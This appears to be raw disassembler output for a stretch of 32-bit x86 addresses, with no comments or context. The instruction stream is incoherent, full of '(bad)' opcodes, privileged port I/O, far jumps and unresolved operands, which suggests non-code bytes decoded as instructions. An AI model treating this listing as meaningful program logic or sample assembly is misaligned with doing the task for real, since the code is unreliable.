  404a06:	push   ebx
  404a07:	xor    edx,ebp
  404a09:	fdiv   QWORD PTR [ebx-0x3119c440]
  404a0f:	leave  
  404a10:	jmp    0x404a4c
  404a12:	add    eax,0xde32b8ab
  404a17:	push   ebp
  404a18:	dec    esi
  404a19:	mov    ds:0xbd2f629c,eax
  404a1e:	shr    BYTE PTR [esi+0x4b],0xe7
  404a22:	fmul   DWORD PTR [ebx+0x66]
  404a25:	xchg   ebp,eax
  404a26:	out    dx,al
  404a27:	and    esi,eax
  404a29:	add    al,0x9e
  404a2b:	jl     0x4049c9
  404a2d:	pushf  
  404a2e:	call   0x5b2c:0x7804147e
  404a35:	ret    0x8e26
  404a38:	scas   al,BYTE PTR es:[edi]
  404a39:	sub    BYTE PTR [esi-0x4a],dl
  404a3c:	data16 cld 
  404a3e:	jo     0x4049e4
  404a40:	pop    edx
  404a41:	loop   0x404a05
  404a43:	ins    DWORD PTR es:[edi],dx
  404a44:	popf   
  404a45:	pop    eax
  404a46:	pop    ds
  404a47:	cmc    
  404a48:	lock xchg ecx,eax
  404a4a:	pop    esp
  404a4b:	push   esi
  404a4c:	mov    ebp,0x4c75ce60
  404a51:	jl     0x404a72
  404a53:	(bad)
  404a56:	xchg   ebx,eax
  404a57:	mov    al,0x2
  404a59:	fisub  WORD PTR [ecx+0x3cdbc6da]
  404a5f:	pop    esi
  404a60:	xchg   edi,eax
  404a61:	inc    ecx
  404a62:	imul   BYTE PTR [esi-0x7b]
  404a65:	xor    BYTE PTR [eax],ch
  404a67:	arpl   WORD PTR [ebp+0x2f],cx
  404a6a:	or     dl,BYTE PTR ds:0xf347c209
  404a70:	inc    esi
  404a71:	adc    eax,0x59976f03
  404a76:	dec    edx
  404a77:	std    
  404a78:	nop
  404a79:	and    ah,0xe3
  404a7c:	add    al,ah
  404a7e:	hlt    
  404a7f:	out    0x67,al
  404a81:	or     edi,DWORD PTR [eax]
  404a83:	mov    WORD PTR [ebx-0x1f78e34f],ds
  404a89:	push   edi
  404a8a:	or     esi,ebp
  404a8c:	out    dx,al
  404a8d:	xchg   ebx,eax
  404a8e:	mov    ecx,0x3266f7df
  404a93:	push   eax
  404a94:	mov    DWORD PTR [ebx-0x49],eax
  404a97:	fs push esp
  404a99:	and    al,0xc5
  404a9b:	push   ebx
  404a9c:	pop    esp
  404a9d:	ficomp DWORD PTR [esi-0x15631d83]
  404aa3:	ds lock scas al,BYTE PTR es:[edi]
  404aa6:	out    dx,al
  404aa7:	fst    QWORD PTR [esi]
  404aa9:	ss ja  0x404b1c
  404aac:	adc    BYTE PTR [ecx+0x40db710a],dh
  404ab2:	js     0x404ae4
  404ab4:	jmp    0xaf79:0xeed195a1
  404abb:	and    eax,0x3862567
  404ac0:	dec    edi
  404ac1:	out    dx,eax
  404ac2:	push   ss
  404ac3:	jno    0x404ada
  404ac5:	or     DWORD PTR [edx+0x5870d5a3],edx
  404acb:	jae    0x404b48
  404acd:	xor    DWORD PTR [edx+0x2d8c43d6],esi
  404ad3:	pop    ss
  404ad4:	(bad)  
  404ad5:	mov    ecx,0x3a7da11b
  404ada:	adc    ebp,ebp
  404adc:	add    cl,BYTE PTR fs:[eax-0x4d]
  404ae0:	jno    0x404a71
  404ae2:	retf   0x3b33
  404ae5:	and    eax,0x4aaf62fe
  404aea:	int3   
  404aeb:	push   esp
  404aec:	out    dx,eax
  404aed:	inc    ebp
  404aee:	push   edi
  404aef:	inc    eax
  404af0:	js     0x404ac7
  404af2:	into   
  404af3:	cdq    
  404af4:	stc    
  404af5:	push   0x52
  404af7:	test   DWORD PTR [ebx],ebx
  404af9:	and    BYTE PTR [ecx+0x56],dl
  404afc:	das    
  404afd:	cs jo  0x404a9f
  404b00:	cs fxch st(7)
  404b03:	or     eax,0xae976a78
  404b08:	lods   eax,DWORD PTR ds:[esi]
  404b09:	sub    DWORD PTR [edi],0x7b
  404b0c:	push   ds
  404b0d:	scas   al,BYTE PTR es:[edi]
  404b0e:	shr    BYTE PTR [esi+0x26],1
  404b11:	or     edx,edx
  404b13:	xor    esi,DWORD PTR [esi+ebx*4]
  404b16:	lods   eax,DWORD PTR ds:[esi]
  404b17:	test   BYTE PTR [edi-0x7e],al
  404b1a:	jecxz  0x404aaa
  404b1c:	dec    esp
  404b1d:	and    DWORD PTR [ecx+0x2208bfda],ecx
  404b23:	mov    ds:0x71afb96f,al
  404b28:	mov    DWORD PTR [edx+0x36],edi
  404b2b:	(bad)  
  404b2c:	pop    ebx
  404b2d:	out    dx,al
  404b2e:	popf   
  404b2f:	ja     0x404b10
  404b31:	push   0xc0123688
  404b36:	mov    ebp,0x7fd66d01
  404b3b:	cmp    DWORD PTR [ebp+0x6],ebp
  404b3e:	add    eax,0xd9d42807
  404b43:	mov    eax,0xea1eb6a1
  404b48:	iret   
  404b49:	(bad)  
  404b4a:	sbb    dl,dl
  404b4c:	(bad)  
  404b4d:	xchg   esp,eax
  404b4e:	mov    ebp,0xbb8480a3
  404b53:	es jge 0x404b07
  404b56:	test   al,0x25
  404b58:	sar    DWORD PTR [eax-0x2c9dfa29],cl
  404b5e:	jns    0x404bc2
  404b60:	outs   dx,DWORD PTR ds:[esi]
  404b61:	jge    0x404b63
  404b63:	sub    ebp,DWORD PTR [edx-0x36]
  404b66:	mov    bl,0x6
  404b68:	cmp    al,0xca
  404b6a:	push   ebp
  404b6b:	xchg   edx,eax
  404b6c:	push   ds
  404b6d:	cmp    ah,0x71
  404b70:	(bad)  [ebp-0x7c]
  404b73:	jo     0x404b72
  404b75:	lahf   
  404b76:	xchg   ecx,eax
  404b77:	les    edi,FWORD PTR ds:0xc3e6e040
  404b7d:	jb     0x404bc8
  404b7f:	mov    cl,0xbd
  404b81:	jne    0x404b6d
  404b83:	sahf   
  404b84:	cld    
  404b85:	aad    0x2f
  404b87:	push   cs
  404b88:	sub    al,0x31
  404b8a:	stos   BYTE PTR es:[edi],al
  404b8b:	and    eax,0xa3c7d139
  404b90:	out    0xee,eax
  404b92:	xor    DWORD PTR [edx],edx
  404b94:	fild   QWORD PTR [esi-0x6c477874]
  404b9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404b9b:	adc    BYTE PTR [ebx],bl
  404b9d:	aad    0x65
  404b9f:	loopne 0x404b3a
  404ba1:	mov    dl,0xa
  404ba3:	stos   BYTE PTR es:[edi],al
  404ba4:	fiadd  DWORD PTR [esi-0x7c2ec592]
  404baa:	dec    esp
  404bab:	loopne 0x404ba6
  404bad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404bae:	popf   
  404baf:	xor    al,0x60
  404bb1:	jo     0x404b49
  404bb3:	cmp    dh,BYTE PTR [esi-0x21450a7b]
  404bb9:	loopne 0x404bd8
  404bbb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404bbc:	aad    0xf
  404bbe:	adc    DWORD PTR [edi],0x6d0cac51
  404bc4:	sub    ebx,DWORD PTR [eax+0x34]
  404bc7:	mov    al,ds:0x2831e292
  404bcc:	push   edi
  404bcd:	xchg   edx,eax
  404bce:	push   ebx
  404bcf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404bd0:	data16 adc ch,dh
  404bd3:	leave  
  404bd4:	xchg   ebp,eax
  404bd5:	fbstp  TBYTE PTR [edx]
  404bd7:	out    dx,eax
  404bd8:	push   ecx
  404bd9:	adc    DWORD PTR [edx-0x62],0x18
  404bdd:	mov    ecx,0x2e0168c2
  404be2:	shl    BYTE PTR [ebx+edi*8],cl
  404be5:	jmp    0xd06a:0xf842e2bf
  404bec:	or     al,0x59
  404bee:	ficom  WORD PTR [edx]
  404bf0:	out    dx,al
  404bf1:	jge    0x404c5e
  404bf3:	xchg   DWORD PTR [eax],eax
  404bf5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404bf6:	add    DWORD PTR [eax+esi*1+0x14],ebp
  404bfa:	loope  0x404c18
  404bfc:	mov    cl,0xe2
  404bfe:	(bad)  
  404c00:	mov    ah,0x51
  404c02:	sub    BYTE PTR [esi+edi*8],cl
  404c05:	fwait
  404c06:	retf   
  404c07:	inc    eax
  404c08:	xor    edi,DWORD PTR [eax-0x7d]
  404c0b:	mov    al,ds:0x31b7998a
  404c10:	or     eax,0x530ad079
  404c15:	xchg   edx,eax
  404c16:	icebp  
  404c17:	hlt    
  404c18:	xor    cl,BYTE PTR [edi-0x80]
  404c1b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404c1c:	jp     0x404c54
  404c1e:	sbb    eax,0x3844cce4
  404c23:	push   cs
  404c24:	xchg   esi,eax
  404c25:	sbb    BYTE PTR [ebx+0x3e925d8f],ah
  404c2b:	gs push 0x6b665382
  404c31:	add    al,0x99
  404c33:	leave  
  404c34:	out    dx,al
  404c35:	repz int 0xfe
  404c38:	add    edi,DWORD PTR [ecx]
  404c3a:	aad    0xf8
  404c3c:	sbb    ecx,DWORD PTR [eax+0x55]
  404c3f:	loopne 0x404c37
  404c41:	stos   BYTE PTR es:[edi],al
  404c42:	or     BYTE PTR [ebx],ch
  404c44:	lea    eax,[esi]
  404c46:	sahf   
  404c47:	xor    eax,0xf4fae0c5
  404c4c:	inc    DWORD PTR [edx-0x5aeb3fcb]
  404c52:	sub    ch,BYTE PTR [esi-0x3f]
  404c55:	imul   ecx,DWORD PTR [eax],0xabee641c
  404c5b:	repnz sbb eax,0x5dabbc0c
  404c61:	jecxz  0x404c62
  404c63:	dec    edi
  404c64:	and    DWORD PTR [ecx],ecx
  404c66:	shr    BYTE PTR [ebx+0x6d362972],cl
  404c6c:	xor    BYTE PTR [ebx],al
  404c6e:	test   ch,ch
  404c70:	lods   al,BYTE PTR ds:[esi]
  404c71:	test   BYTE PTR [esi],ah
  404c73:	push   cs
  404c74:	hlt    
  404c75:	sub    cl,bh
  404c77:	add    al,0x33
  404c79:	popw   ss
  404c7b:	or     al,0xfd
  404c7d:	int3   
  404c7e:	dec    ecx
  404c7f:	mov    eax,ds:0xf6a1b872
  404c84:	jb     0x404c7c
  404c86:	cs xchg esi,eax
  404c88:	cdq    
  404c89:	xchg   edx,eax
  404c8a:	test   al,0x17
  404c8c:	dec    edx
  404c8d:	and    BYTE PTR [edi],bh
  404c8f:	in     al,dx
  404c90:	adc    cl,BYTE PTR [eax]
  404c92:	test   DWORD PTR [edi+ecx*4+0x197251f],0x61d5ace6
  404c9d:	sti    
  404c9e:	mov    eax,?
  404ca0:	fisubr DWORD PTR [ebp-0x2b3b023]
  404ca6:	xor    eax,0x89ae9768
  404cac:	leave  
  404cad:	pop    ss
  404cae:	push   esp
  404caf:	mov    DWORD PTR [esp+ebx*4-0x5dff0453],esp
  404cb6:	addr16 js 0x404cdb
  404cb9:	cmp    eax,0xd36106b3
  404cbe:	test   DWORD PTR [edi+0x5d],edx
  404cc1:	xchg   ecx,eax
  404cc2:	or     al,0x38
  404cc4:	sbb    BYTE PTR ds:[edx],bh
  404cc7:	xchg   edi,eax
  404cc8:	xor    al,0xf6
  404cca:	sbb    dh,BYTE PTR [edx+0x3e94727]
  404cd0:	push   es
  404cd1:	mov    al,0xeb
  404cd3:	dec    edi
  404cd4:	fistp  WORD PTR [ecx]
  404cd6:	ins    DWORD PTR es:[edi],dx
  404cd7:	cmp    DWORD PTR [ecx],0xf74853df
  404cdd:	aaa    
  404cde:	iret   
  404cdf:	les    edx,FWORD PTR [edx]
  404ce1:	sbb    eax,0xee2b8965
  404ce6:	add    esi,0x2
  404ce9:	sbb    dh,BYTE PTR [edx+0x5c7380e5]
  404cef:	push   edx
  404cf0:	fldcw  WORD PTR [edx]
  404cf2:	call   0xb753:0xedc7ff88
  404cf9:	fcmovu st,st(6)
  404cfb:	dec    ebx
  404cfc:	mov    ebp,0xad1a9fdc
  404d01:	lock mov esi,eax
  404d04:	test   al,0xb7
  404d06:	(bad)  
  404d07:	stc    
  404d08:	scas   al,BYTE PTR es:[edi]
  404d09:	addr16 xchg ebx,eax
  404d0b:	pusha  
  404d0c:	mov    ebp,0xd61f5236
  404d11:	add    al,0xd5
  404d13:	mov    bh,0xa1
  404d15:	test   dl,bl
  404d17:	pop    esi
  404d18:	mov    dh,0xd3
  404d1a:	add    dl,BYTE PTR [edi+ebx*4+0x7da3d259]
  404d21:	fdivp  st(5),st
  404d23:	sub    DWORD PTR ds:0xab345e2,0xe57d099e
  404d2d:	sbb    ch,dl
  404d2f:	inc    ebp
  404d30:	jle    0x404ccc
  404d32:	push   cs
  404d33:	(bad)  
  404d34:	rcr    BYTE PTR [eax],1
  404d36:	mov    ah,0xe7
  404d38:	ret    0xf297
  404d3b:	shl    BYTE PTR [ecx],0x1a
  404d3e:	push   ss
  404d3f:	pop    esi
  404d40:	adc    BYTE PTR [edi+0x40],bh
  404d43:	inc    ecx
  404d44:	(bad)  
  404d45:	fist   DWORD PTR [ebx-0x8]
  404d48:	inc    edi
  404d49:	add    DWORD PTR es:[edx+0x2dab6bae],0x57
  404d51:	addr16 mov ds:0x1df3,eax
  404d55:	adc    DWORD PTR [ebx-0x40],edi
  404d58:	ficomp DWORD PTR [eax+0x16]
  404d5b:	inc    ecx
  404d5c:	out    dx,eax
  404d5d:	leave  
  404d5e:	data16 fcomp QWORD PTR [esi]
  404d61:	jne    0x404d48
  404d63:	retf   0x74ab
  404d66:	jmp    0x404d95
  404d68:	aaa    
  404d69:	inc    edi
  404d6a:	adc    BYTE PTR [edi-0x4fbef20],0xe3
  404d71:	out    dx,eax
  404d72:	push   0x1d
  404d74:	retf   0x5581
  404d77:	sbb    eax,0xf9ef9f89
  404d7c:	sbb    ch,BYTE PTR [eax+0x75]
  404d7f:	clc    
  404d80:	pop    ecx
  404d81:	fcmovne st,st(5)
  404d83:	cdq    
  404d84:	ins    DWORD PTR es:[edi],dx
  404d85:	and    BYTE PTR [ebp-0x41],bl
  404d88:	jge    0x404d47
  404d8a:	push   edx
  404d8b:	fnstenv [ebp-0x73d50f1d]
  404d91:	out    dx,eax
  404d92:	shr    BYTE PTR [ecx-0x59],cl
  404d95:	aam    0x43
  404d97:	test   esp,0x208c8be
  404d9d:	push   ebp
  404d9e:	xor    eax,0x944a7d4d
  404da3:	dec    esp
  404da4:	mov    ebx,0x7c27d4c0
  404da9:	icebp  
  404daa:	mov    bl,0x2
  404dac:	jl     0x404e1c
  404dae:	nop
  404daf:	leave  
  404db0:	mov    cl,0xf4
  404db2:	call   FWORD PTR [ebx+0x71]
  404db5:	push   es
  404db6:	add    dh,BYTE PTR [esi+0x72]
  404db9:	xchg   esp,eax
  404dba:	sub    bh,ah
  404dbc:	ss push esi
  404dbe:	retf   
  404dbf:	adc    esi,DWORD PTR [ebp+0x4cc948f3]
  404dc5:	in     al,dx
  404dc6:	inc    edx
  404dc7:	out    dx,eax
  404dc8:	sub    al,ch
  404dca:	dec    ebp
  404dcb:	xor    bl,cl
  404dcd:	out    0xd7,eax
  404dcf:	pop    esi
  404dd0:	push   es
  404dd1:	jmp    0x404d92
  404dd3:	mov    eax,0xe64a9ea5
  404dd8:	or     ecx,esp
  404dda:	loope  0x404d95
  404ddc:	adc    ebx,edi
  404dde:	(bad)  
  404ddf:	push   ds
  404de0:	(bad)  
  404de1:	dec    ah
  404de3:	out    0x85,al
  404de5:	push   ebx
  404de6:	idiv   BYTE PTR [ebp-0x63]
  404de9:	out    dx,al
  404dea:	jecxz  0x404df3
  404dec:	mov    ?,WORD PTR [ebx]
  404dee:	inc    edx
  404def:	inc    eax
  404df0:	sar    BYTE PTR [esi+0x2],1
  404df3:	mov    cl,0xbb
  404df5:	loopne 0x404dc2
  404df7:	pop    ebx
  404df8:	xor    al,0x75
  404dfa:	dec    esp
  404dfb:	into   
  404dfc:	leave  
  404dfd:	in     eax,dx
  404dfe:	xchg   BYTE PTR [edi+0x59b4bc78],al
  404e04:	dec    esp
  404e05:	cmp    edi,edi
  404e07:	mov    esi,0xcb1b843c
  404e0c:	add    cl,dh
  404e0e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404e0f:	dec    esi
  404e10:	sub    BYTE PTR [eax-0x37],0xc3
  404e14:	jae    0x404d9b
  404e16:	mov    dl,0x3d
  404e18:	sub    ebx,DWORD PTR [edx]
  404e1a:	jae    0x404e4b
  404e1c:	stos   DWORD PTR es:[edi],eax
  404e1d:	push   es
  404e1e:	push   es
  404e1f:	call   0xdbb3f79b
  404e24:	dec    DWORD PTR [edx-0x5]
  404e27:	fwait
  404e28:	inc    edi
  404e29:	cmc    
  404e2a:	adc    al,0xe0
  404e2c:	pushf  
  404e2d:	xor    ch,BYTE PTR [edx-0x4b]
  404e30:	or     DWORD PTR [edx+0x1ddc6abb],esi
  404e36:	ret    0xba24
  404e39:	mov    DWORD PTR [ebx-0x1b],edx
  404e3c:	leave  
  404e3d:	sbb    eax,edx
  404e3f:	fwait
  404e40:	rcr    DWORD PTR [ecx+0xd088e01],cl
  404e46:	mov    ds:0xdb655d3,al
  404e4b:	mov    al,ds:0x7142b327
  404e50:	xor    al,0x7c
  404e52:	fistp  DWORD PTR [edi]
  404e54:	pmaxsw mm0,mm6
  404e57:	fwait
  404e58:	les    esi,FWORD PTR [esi+0x36ab8cb8]
  404e5e:	test   ch,ch
  404e60:	retf   
  404e61:	mov    al,BYTE PTR [ebx]
  404e63:	push   ecx
  404e64:	mov    ecx,0x3b51bf37
  404e69:	dec    esp
  404e6a:	pop    esi
  404e6b:	mov    eax,0xb241d3e9
  404e70:	not    BYTE PTR [ebx+ebx*8+0x7fe31d2]
  404e77:	aaa    
  404e78:	cld    
  404e79:	or     edx,DWORD PTR [edi-0x78151e95]
  404e7f:	rcr    DWORD PTR [ebp-0x2b],0xd9
  404e83:	add    eax,0xeaae8a46
  404e88:	xor    ecx,DWORD PTR [ecx]
  404e8a:	cmc    
  404e8b:	(bad)  
  404e8c:	cdq    
  404e8d:	aad    0xf0
  404e8f:	jno    0x404ed5
  404e91:	int3   
  404e92:	pop    edx
  404e93:	ror    ah,1
  404e95:	sub    BYTE PTR [ecx],al
  404e97:	adc    BYTE PTR [ebx-0x59730e88],ch
  404e9d:	jno    0x404ef9
  404e9f:	or     edx,DWORD PTR [esi]
  404ea1:	sbb    BYTE PTR [ebx-0x401fefcf],dh
  404ea7:	call   0xf26a:0x1e165d6e
  404eae:	inc    ecx
  404eaf:	(bad)  
  404eb0:	xor    al,0x58
  404eb2:	lea    esp,[ebx-0x3f]
  404eb5:	jl     0x404e99
  404eb7:	mov    gs,WORD PTR [ecx+0x3c80a505]
  404ebd:	jle    0x404e52
  404ebf:	add    eax,0xfa268c18
  404ec4:	sub    al,0xe1
  404ec6:	loop   0x404e89
  404ec8:	add    ecx,DWORD PTR [ebp+0x207ccab]
  404ece:	jb     0x404ea3
  404ed0:	popa   
  404ed1:	mov    eax,ds:0xc874b370
  404ed6:	mov    ebp,0xeea82420
  404edb:	inc    esp
  404edc:	mov    ebp,0xdd68e4f7
  404ee1:	dec    ebx
  404ee2:	ins    BYTE PTR es:[edi],dx
  404ee3:	in     al,dx
  404ee4:	mov    ebp,0x594e0206
  404ee9:	inc    ebx
  404eea:	aaa    
  404eeb:	fdivr  DWORD PTR [esi+0x5f]
  404eee:	cmp    eax,0x88e8ffee
  404ef3:	enter  0x275e,0x93
  404ef7:	push   esi
  404ef8:	lods   eax,DWORD PTR ds:[esi]
  404ef9:	xchg   esi,eax
  404efa:	sbb    al,0xb2
  404efc:	fld    DWORD PTR [ecx+esi*4-0x25]
  404f00:	int3   
  404f01:	jno    0x404eb3
  404f03:	xchg   edi,eax
  404f04:	(bad)  
  404f06:	xor    eax,0x112d7498
  404f0b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404f0c:	dec    eax
  404f0d:	es out 0xa1,al
  404f10:	xchg   esi,eax
  404f11:	push   ss
  404f12:	or     BYTE PTR [ebx+edx*2],ch
  404f15:	sub    eax,0x8ca19b6f
  404f1a:	mov    bl,0xb9
  404f1c:	js     0x404f0c
  404f1e:	jle    0x404f1e
  404f20:	jnp    0x404ea3
  404f22:	lock cmp DWORD PTR [edi-0x53b93011],edx
  404f29:	jne    0x404f17
  404f2b:	push   eax
  404f2c:	inc    ebx
  404f2d:	hlt    
  404f2e:	jnp    0x404f04
  404f30:	sbb    eax,ebp
  404f32:	jnp    0x404eed
  404f34:	enter  0x7a6f,0x92
  404f38:	jp     0x404f71
  404f3a:	push   ecx
  404f3b:	xchg   ecx,eax
  404f3c:	(bad)  
  404f3d:	adc    eax,0xea10f1cb
  404f42:	dec    esi
  404f43:	adc    ecx,edi
  404f45:	jne    0x404ee0
  404f47:	mov    ecx,0xae7ef261
  404f4c:	xchg   edx,eax
  404f4d:	pop    edi
  404f4e:	sub    eax,0x38ca5448
  404f53:	inc    edi
  404f54:	test   BYTE PTR [edx],bl
  404f56:	es push ebp
  404f58:	mov    edx,DWORD PTR [edx-0x22]
  404f5b:	push   cs
  404f5c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404f5d:	jb     0x404ef4
  404f5f:	push   0xfffffff7
  404f61:	mov    ds:0xc716ec8d,eax
  404f66:	adc    ch,BYTE PTR [edi]
  404f68:	jns    0x404fc7
  404f6a:	sbb    dl,BYTE PTR [edx-0x10]
  404f6d:	or     DWORD PTR [esi-0x42],0x29
  404f71:	mov    ch,0xba
  404f73:	lds    ebx,FWORD PTR [esi-0x69]
  404f76:	cdq    
  404f77:	push   edx
  404f78:	and    al,0xa7
  404f7a:	outs   dx,DWORD PTR ds:[esi]
  404f7b:	xor    BYTE PTR [edi+0x477e65fe],ah
  404f81:	mov    WORD PTR [ecx+0x11],fs
  404f84:	lahf   
  404f85:	fcmove st,st(2)
  404f87:	mov    dh,0xd5
  404f89:	mov    ?,esp
  404f8b:	add    cl,ah
  404f8d:	repz and BYTE PTR [edi+ebx*8],al
  404f91:	xor    BYTE PTR [ebp-0x54],bh
  404f94:	scas   eax,DWORD PTR es:[edi]
  404f95:	mov    edi,0xab4c15ba
  404f9a:	aas    
  404f9b:	pop    esp
  404f9c:	sbb    BYTE PTR [eax-0x558c81c7],ch
  404fa2:	aam    0xdf
  404fa4:	in     al,0x6c
  404fa6:	jne    0x404f47
  404fa8:	loopne 0x404f97
  404faa:	pop    ss
  404fab:	mov    bh,0xcb
  404fad:	in     eax,0x6e
  404faf:	and    BYTE PTR [esi],ah
  404fb1:	outs   dx,DWORD PTR ds:[esi]
  404fb2:	aaa    
  404fb3:	sti    
  404fb4:	nop
  404fb5:	jmp    0x404f65
  404fb7:	bound  ebx,QWORD PTR [ebx-0x237bf02f]
  404fbd:	loope  0x404fcf
  404fbf:	and    DWORD PTR [ecx-0x9f8db39],ebx
  404fc5:	scas   al,BYTE PTR es:[edi]
  404fc6:	pop    edi
  404fc7:	push   0x60
  404fc9:	inc    esp
  404fca:	and    DWORD PTR [ecx+0x75],ebx
  404fcd:	in     eax,0xf
  404fcf:	imul   esp,DWORD PTR [edx+0x7f],0x7314e253
  404fd6:	pop    edi
  404fd7:	test   al,0xce
  404fd9:	mov    esp,0xdfd39022
  404fde:	std    
  404fdf:	dec    esp
  404fe0:	push   eax
  404fe1:	dec    ebp
  404fe2:	jmp    0x404fbf
  404fe4:	sub    al,0x92
  404fe6:	das    
  404fe7:	pusha  
  404fe8:	cmp    ebx,DWORD PTR [edx]
  404fea:	inc    ebx
  404feb:	pusha  
  404fec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404fed:	xchg   esp,eax
  404fee:	sub    eax,0xed886dfd
  404ff3:	in     al,dx
  404ff4:	push   0x9fcecf50
  404ff9:	push   ebx
  404ffa:	push   ecx
  404ffb:	test   eax,0xe6984324
  405000:	leave  
  405001:	(bad)
  405005:	in     eax,dx
  405006:	stos   BYTE PTR es:[edi],al
  405007:	and    esi,DWORD PTR [edi+eax*4+0x9]
  40500b:	sub    al,0xf1
  40500d:	mov    dh,0x82
  40500f:	xor    eax,0xcb46935
  405014:	jmp    0x274a:0xe06230b0
  40501b:	jnp    0x404feb
  40501d:	sub    BYTE PTR [ecx-0x7d],bh
  405020:	(bad)  
  405022:	cmp    ecx,eax
  405024:	dec    ecx
  405025:	cmc    
  405026:	pop    DWORD PTR [edx-0x2a]
  405029:	scas   eax,DWORD PTR es:[edi]
  40502a:	mov    edi,0x28bbf329
  40502f:	(bad)  
  405031:	ins    DWORD PTR es:[edi],dx
  405032:	loop   0x40501e
  405034:	jecxz  0x4050b2
  405036:	int    0x9b
  405038:	inc    eax
  405039:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40503a:	nop
  40503b:	mov    ch,0x62
  40503d:	xchg   edi,eax
  40503e:	jbe    0x404fdb
  405040:	or     eax,0x9cf953a5
  405045:	lds    ebx,FWORD PTR [ebp+0x4aaba071]
  40504b:	aad    0x3d
  40504d:	and    eax,DWORD PTR [edi-0x1c]
  405050:	fwait
  405051:	lods   al,BYTE PTR ds:[esi]
  405052:	and    bl,ah
  405054:	fldcw  WORD PTR [ecx-0x5562bc45]
  40505a:	das    
  40505b:	popa   
  40505c:	jmp    0x4050c1
  40505e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40505f:	jmp    0x4050ad
  405061:	pop    ecx
  405062:	push   0xffffffce
  405064:	mov    eax,0xd4bc88cc
  405069:	and    ebp,DWORD PTR [ebp-0x7c949da3]
  40506f:	mov    ebp,0x47ca1561
  405074:	shr    BYTE PTR [eax+0x14c3fa4],1
  40507a:	mov    bl,BYTE PTR [ebp-0x79537a5f]
  405080:	mov    ss,WORD PTR [ebx+0x48]
  405083:	push   ecx
  405084:	adc    al,0x3a
  405086:	into   
  405087:	sub    al,ah
  405089:	cld    
  40508a:	xor    al,0x1d
  40508c:	sub    BYTE PTR [esp+edi*2+0x4cb8de],bl
  405093:	cmp    DWORD PTR [ecx-0x20eb227b],esi
  405099:	stc    
  40509a:	stos   DWORD PTR es:[edi],eax
  40509b:	lds    esi,FWORD PTR [ebx+0x46]
  40509e:	sbb    BYTE PTR [edx-0x676937c3],bh
  4050a4:	sahf   
  4050a5:	jae    0x4050b5
  4050a7:	push   ss
  4050a8:	sbb    al,0xd5
  4050aa:	mov    ah,0x4
  4050ac:	sbb    esi,DWORD PTR [edi+0x30b64343]
  4050b2:	jecxz  0x4050f6
  4050b4:	jle    0x4050c5
  4050b6:	and    BYTE PTR [edx-0x46199d59],bl
  4050bc:	mov    ds:0xb1814e02,al
  4050c1:	sbb    dh,0xb1
  4050c4:	mov    ds:0xcad440fd,al
  4050c9:	cdq    
  4050ca:	jo     0x4050d0
  4050cc:	les    esp,FWORD PTR [ebx]
  4050ce:	cmp    dl,dl
  4050d0:	aaa    
  4050d1:	pop    edx
  4050d2:	jo     0x40514a
  4050d4:	je     0x405152
  4050d6:	(bad)  
  4050d7:	sub    al,0xe9
  4050d9:	mov    ah,0xd2
  4050db:	ja     0x4050d3
  4050dd:	pusha  
  4050de:	mov    ds:0xb60ee834,al
  4050e3:	jo     0x40515c
  4050e5:	lea    ebp,[ebx]
  4050e7:	std    
  4050e8:	test   DWORD PTR [ebx+0x6abe130b],ebx
  4050ee:	push   esi
  4050ef:	xor    eax,0x20770a93
  4050f4:	inc    eax
  4050f5:	pop    ds
  4050f6:	or     DWORD PTR [ecx],ebx
  4050f8:	jbe    0x405123
  4050fa:	ds cmp eax,0x7699d5a2
  405100:	inc    ebx
  405101:	jg     0x4050fb
  405103:	xchg   ecx,eax
  405104:	shl    DWORD PTR [edx+0xf05603b],1
  40510a:	sub    dl,al
  40510c:	jne    0x40513c
  40510e:	jmp    0x7b9e585
  405113:	out    0x2f,al
  405115:	fdiv   DWORD PTR [esi-0x60]
  405118:	pop    eax
  405119:	cld    
  40511a:	sbb    al,0x7e
  40511c:	jecxz  0x405155
  40511e:	mul    BYTE PTR [eax+0x330b7a48]
  405124:	mov    ecx,DWORD PTR [esi]
  405126:	pop    edi
  405127:	shl    BYTE PTR [esi+0x46b94a22],0x5b
  40512e:	cmp    esp,DWORD PTR [eax]
  405130:	pop    es
  405131:	in     eax,0xb7
  405133:	(bad)
  405137:	push   0xba9790bd
  40513c:	push   0x58778f22
  405141:	daa    
  405142:	xchg   ecx,eax
  405143:	out    dx,al
  405144:	mov    WORD PTR [ebp+0x11],gs
  405147:	pop    eax
  405148:	jge    0x405190
  40514a:	xor    al,0x98
  40514c:	mov    eax,ds:0x969aaec0
  405151:	inc    edi
  405152:	fadd   DWORD PTR [ebx]
  405154:	add    esp,DWORD PTR [esi-0x2b]
  405157:	lods   al,BYTE PTR ds:[esi]
  405158:	mov    ecx,0x93883964
  40515d:	(bad)  
  40515e:	es cwde 
  405160:	aas    
  405161:	adc    al,0xa2
  405163:	fisub  DWORD PTR [ebp+0x332a318f]
  405169:	push   ds
  40516a:	mov    bl,0xd5
  40516c:	sahf   
  40516d:	ror    ebp,1
  40516f:	pop    ds
  405170:	fstp   DWORD PTR [edx-0x1e0efc95]
  405176:	(bad)  
  405177:	pop    ds
  405178:	xchg   BYTE PTR [edx-0xd],cl
  40517b:	xchg   ebp,ebx
  40517d:	jmp    0x5251:0x21bf5bb
  405184:	cmp    eax,0x6e1ba413
  405189:	dec    esi
  40518a:	xchg   ebp,eax
  40518b:	aad    0x2f
  40518d:	outs   dx,DWORD PTR ds:[esi]
  40518e:	ret    
  40518f:	jecxz  0x40520c
  405191:	pop    ds
  405192:	ins    DWORD PTR es:[edi],dx
  405193:	inc    ebp
  405194:	cmp    edi,DWORD PTR [eax+0x593525e6]
  40519a:	sbb    DWORD PTR [ebx-0x74],esi
  40519d:	pop    es
  40519e:	iret   
  40519f:	jmp    0x4051fd
  4051a1:	sub    eax,0xe45cd5b3
  4051a6:	pop    ds
  4051a7:	jmp    0x4051c9
